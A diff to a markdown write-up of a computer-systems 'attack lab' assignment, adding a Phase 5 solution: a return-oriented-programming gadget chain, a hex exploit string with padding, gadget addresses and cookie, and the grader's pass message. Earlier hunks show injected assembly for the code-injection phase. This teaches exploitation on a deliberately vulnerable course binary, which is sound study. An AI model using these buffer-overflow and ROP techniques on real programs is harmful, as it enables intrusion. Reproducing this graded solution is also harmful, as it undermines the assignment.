@@ -248,7 +248,7 @@ Our goal is to modify the %rdi register and store the cookie in it. We need some
 
 Create a file called atk2.s and write the code below with your own cookie
 
-```assembly
+```
 movq $0x5f5bd74e,%rdi           /* move the cookie into register %rdi */
 retq                             /* return */
 ```
@@ -445,8 +445,7 @@ NICE JOB!
 > because it uses two techniques to thwart such attacks:
 >
 > * It uses randomization so that the stack positions differ from one run to another. This makes it impossibleto determine where your injected code will be located.
-> * It marks the section of memory holding the stack as nonexecutable, so even if you could set the
->   program counter to the start of your injected code, the program would fail with a segmentation fault.
+> * It marks the section of memory holding the stack as nonexecutable, so even if you could set the program counter to the start of your injected code, the program would fail with a segmentation fault.
 >
 > The solution for this is to use ROP (Return Oriented Programming). What ROP does is that since we can't execute our own code, we will look for instructions in the code that do the same thing as what we want. These are called gadgets and by combining these gadgets, we will be able to perform our exploit. 
 
@@ -807,3 +806,62 @@ NICE JOB!
 ```
 
 <h3 id = "phase5">Phase 5</h3>
+
+This phase is similar to the combination of phase 3 and phase 4 except we are required 8 gadgets (not all of which are unique). We need to pass the address stored in %rsp to %rdi first, and set the value of %rax as the offset of the address of our cookie string in the stack. Then copy it to %esi. The sum of %rdi and %rsi will be the address that stores the cookie string.
+
+The file can be create according to codes below
+
+```
+mov   %rsp,%rax
+ret
+mov   %rax,%rdi
+ret
+popq  %rax         
+ret                 
+movl  %eax,%edx
+ret
+movl  %edx,%ecx
+ret
+movl  %ecx,%esi
+ret
+lea   (%rdi,%rsi,1),%rax
+ret
+mov   %rax,%rdi
+ret
+```
+
+The order of passing value between registers can be adjust according to the disasembled code of  your own file `rtarget` 
+
+When doing the first command, %rsp will point to the address of the next command in the stack. And the rest commands will not change the value of %rsp.
+
+Therefore the offset of the address of cookie string is 0x48 because there are 9 commands (0x48 bits) between the first command and the cookie string.
+
+Now we can create atk5.txt like codes below
+
+```
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00               /* padding */
+fb 5b 55 55 55 55 00 00				 /* use gadget 1 address to rewrite the return address*/
+24 5b 55 55 55 55 00 00				 /* gadget 2 address */
+13 5b 55 55 55 55 00 00				 /* gadget 3 address */
+48 00 00 00 00 00 00 00				 /* offset of the cookie string */
+8f 5b 55 55 55 55 00 00				 /* gadget 4 address */
+cb 5b 55 55 55 55 00 00				 /* gadget 5 address */
+f5 5b 55 55 55 55 00 00				 /* gadget 6 address */
+3d 5b 55 55 55 55 00 00				 /* gadget 7 address */
+24 5b 55 55 55 55 00 00				 /* gadget 8 address */
+6e 5a 55 55 55 55 00 00				 /* touch3 address */
+35 66 35 62 64 37 34 65				 /* cookie string */
+```
+
+The final result
+
+```
+Cookie: 0x5f5bd74e
+Type string:Touch3!: You called touch3("5f5bd74e")
+Valid solution for level 3 with target rtarget
+PASS: Sent exploit string to server to be validated.
+NICE JOB!
+```
+
